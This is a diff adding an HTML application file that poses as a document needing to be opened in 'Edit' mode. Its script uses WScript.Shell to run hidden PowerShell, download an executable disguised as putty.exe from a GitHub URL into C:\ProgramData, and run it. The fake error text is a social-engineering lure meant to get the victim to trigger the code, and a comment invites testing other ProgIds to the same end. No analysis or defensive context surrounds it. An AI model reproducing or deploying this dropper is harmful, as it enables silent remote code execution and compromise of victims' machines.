@@ -1,0 +1,20 @@
+<html>
+<head><meta name=ProgId content=htafile> 
+
+<!-- htafile is just an exmaple of 'ProgId'...others are possible, you may test all available ProgIds at will! -->
+
+</head>
+<hta:application id=x>
+<script>
+try { if (x.commandLine != "") {
+new ActiveXObject('WScript.Shell').Run('powershell.exe -windowstyle hidden curl https://github.com/MASMob2022/dhmas/raw/main/putty.exe -o C://ProgramData//putty.exe |powershell.exe -windowstyle hidden C://ProgramData//putty.exe',1)
+}
+
+}
+
+catch(ex) { alert('Error: This document must be viewed in "Edit" mode: Right-click it, then select the "Edit" menu option. \n If not present, open it with MS IE, make sure the "Menu" bar is displayed, then click "File" menu and then "Edit with...".'); }
+
+
+</script>
+<noscript> Error: This document must be viewed in "Edit" mode: Right-click it, then select the "Edit" menu option. <br> If not present, open it with MS IE, make sure the "Menu" bar is displayed, then click "File" menu and then "Edit with...". </noscript>
+</html>
